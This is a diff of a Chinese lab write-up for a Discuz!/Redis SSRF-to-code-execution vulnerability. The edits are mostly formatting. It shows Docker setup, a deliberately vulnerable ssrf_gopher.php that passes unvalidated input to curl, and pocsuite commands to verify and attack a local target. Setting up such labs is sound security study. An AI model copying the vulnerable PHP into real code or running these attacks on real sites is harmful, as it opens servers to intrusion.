@@ -42,40 +42,40 @@ getshell使我们破坏了网页缓存的数据，会导致网站访问异常，
 flushall
 ```
 ## 0x01环境搭建
-###获取镜像
+### 获取镜像
 环境搭建共使用三个镜像：MySQL、Redis和安装过phpredis的Discuz!  
 其中MySQL和Redis的镜像可用以下命令从官方获取：
 ```
 docker pull mysql
 docker pull redis
 ```
-鉴于国外源的镜像仓库速度缓慢且有时容易中断无响应，建议通过[DaoCloud](https://www.daocloud.io/)拉取镜像
+鉴于国外源的镜像仓库速度缓慢且有时容易中断无响应，建议通过[DaoCloud](https://www.daocloud.io/)拉取镜像  
 
-[安装过phpredis的Discuz!下载地址](http://pan.baidu.com/s/1nvGm46d)
+[安装过phpredis的Discuz!下载地址](http://pan.baidu.com/s/1nvGm46d)  
 
 从discuz.tar.gz恢复出Discuz!镜像：
 
 ```
 gzip -dc discuz.tar.gz | docker load
 ```
-###运行镜像
+### 运行镜像
 Kali(Debian) + Docker(mysql + redis + discuz)
-```
+```shell
 docker run --name dz-mysql -e MYSQL_ROOT_PASSWORD=root -d mysql
 
 docker run --name dz-redis -d redis
 
 docker run --name dz-ssrf --link dz-mysql:mysql -p 8888:80 -d dz-redis-init apache2 "-DFOREGROUND"
 ```
-访问127.0.0.1:8888进行Discuz!的安装.
+访问127.0.0.1:8888进行Discuz!的安装.  
 
-安装过后将config/config_global.php中redis的地址和端口改为redis容器的地址和端口（可用docker inspect dz-redis查看IP）.
+安装过后将config/config_global.php中redis的地址和端口改为redis容器的地址和端口（可用docker inspect dz-redis查看IP）.  
 
-在后台中 全局 -> 性能优化 -> 内存优化 中查看redis是否被启用，若已启用则搭建完成.
+在后台中 全局 -> 性能优化 -> 内存优化 中查看redis是否被启用，若已启用则搭建完成.  
 
 ## 0x02漏洞验证
 在/discuz根目录下放置了ssrf_gopher.php用于构造ssrf.内容如下:
-```
+```php
 <?php
 $ch = curl_init();
 $url = $_GET['ssrf'];
@@ -91,11 +91,11 @@ print_r($output);
 ?>
 ```
 验证：
-```
+```shell
 pocsuite -r discuz_redis_ssrf_exec.py -u "http://127.0.0.1:8888/discuz/ssrf_gopher.php?ssrf=" --verify
 ```
 攻击：
-```
+```shell
 pocsuite -r discuz_redis_ssrf_exec.py -u "http://127.0.0.1:8888/discuz/ssrf_gopher.php?ssrf=" --attack
 ```
 ## 0x03参考
